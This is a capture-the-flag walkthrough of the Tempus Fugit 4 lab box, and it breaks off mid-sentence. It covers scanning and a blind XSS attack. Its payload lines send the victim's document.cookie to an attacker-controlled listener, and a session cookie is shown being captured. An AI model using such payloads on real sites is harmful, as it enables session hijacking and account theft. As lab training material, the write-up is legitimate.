# Tempus Fugit: 4 Walkthrough 

# Description
```bash
Tempus Fugit is a Latin phrase that roughly translated as “time flies”.

This is an hard, real life box, created by @4nqr34z and @theart42.

As in the former Tempus Fugits, #4 the idea is still to create something “out of the ordinary”.

Need any hints? Feel free to contact us on Twitter: @4nqr34z or @theart42

DHCP-Client.

Tested and works both on Virtualbox and vmware

Story:
After being hacked multiple times, the company decides to do things differently this time. They left Linux and choose another operating system that claimed to be more secure. Realising they could have resources inside the company that are willing to help the relative small IT department (originally only web-designers) and the fact (according to Hugh Janus) there are safety in numbers, they start a internal crowdsourcing project. Allowing internal employees to request access to the new server.

```

# Exploiation
Let's start with a network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 20 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1200                                                                                                                                                
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     f0:a7:31:e9:bb:f8      7     420  TP-Link Systems Inc                                                                                                                                            
 192.168.0.100   58:11:22:85:0d:41     12     720  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.108   08:00:27:56:d8:0d      1      60  PCS Systemtechnik GmbH   
```
\
Next open ports
```bash
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
80/tcp open  http    nginx 1.16.1
```
\
Opening port 80
\
<img width="1642" height="692" alt="image" src="https://github.com/user-attachments/assets/3f0d54fd-e1df-4b96-b14f-349fc955502f" />
\
Then when i searched for directories i found
\
<img width="1449" height="778" alt="image" src="https://github.com/user-attachments/assets/9c5af20e-7244-4198-b181-fbe0529e7b8a" />
\
When we click on request access
\
<img width="894" height="375" alt="image" src="https://github.com/user-attachments/assets/97c92884-0ff4-4d06-9f4c-16a83e7189d4" />
\
Then after some trials and errors , i realized that there was a Blind XSS in this page and used the payload
```bash
aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie>
```
\
And got this back
```bash
python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.108 - - [23/Apr/2026 10:28:08] "GET /?c=session=.eJwlz8uqAjEQBNB_ydpFvybp-DND0g8UQWFGV5f77wakdgUFp_7Knkect3J9H5-4lP3u5VqIQNWls2FItHToZn0Dyw2UEtyGtGoyK224sRESr6pylwlDwlBgDoOwldrDGTLAG9Zk465AjIyulc2bA1FQivbMoeQqVC7FziP39-sRz-VJBh1tgoxK2CZ7VFmIRjE71bmImMrN1-5zxvE7IeX_C4sjPs4.aep5yQ.0it_0r1e0aH10l4oAh4KdgFQjgs HTTP/1.1" 200 -
```
\
Then after that we are able to access the staff page
\
<img width="1720" height="747" alt="image" src="https://github.com/user-attachments/assets/8774e7ea-0bfc-472d-80d1-587b2d814b25" />
\
Anyways , since i could not check out the logs tab , since it kept redirecting to my hosted link , i curl'd it
```bash
<div class="jumbotron bg-dark text-white">
  <h1>Logfiles</h1>

  <form action="/admin/logs">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImJiODJhODcwYWFlZWZjYjliODFmOTgzMWQ2ZTIwMTY1M2VhZDVlNjEi.aep73g.csCnKsEOqKOoKe2VkBjGXfQtJUE">
  <label for="log">Logfile: </label>
  <select id="log" name="log"><option selected value="accessrequest.txt">Access requests</option><option value="/var/www/logs/access.log">Website Requests</option><option value="requests.txt">Adminsite Request</option></select>

  <input id="submit" name="submit" type="submit" value="Submit">
<hr>
  </div>
  <pre>
  

    aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie> aaa<svg onload=document.location='http://192.168.0.124/?c='+document.cookie>
aaa<svg onload=document.location='http://192.168.0.124:9000/?c='+document.cookie> aaa<svg onload=document.location='http://192.168.0.124:9000/?c='+document.cookie>
a<svg onload=document.location='http://192.168.0.124:9001/cookies.php?c='+document.cookie;> a<svg onload=document.location='http://192.168.0.124:9001/cookies.php?c='+document.cookie;>


```
\
Here i saw my previous attempts to get the cookie and also a "accessrequest.txt" log located at /var/www/logs/access.log which had these values
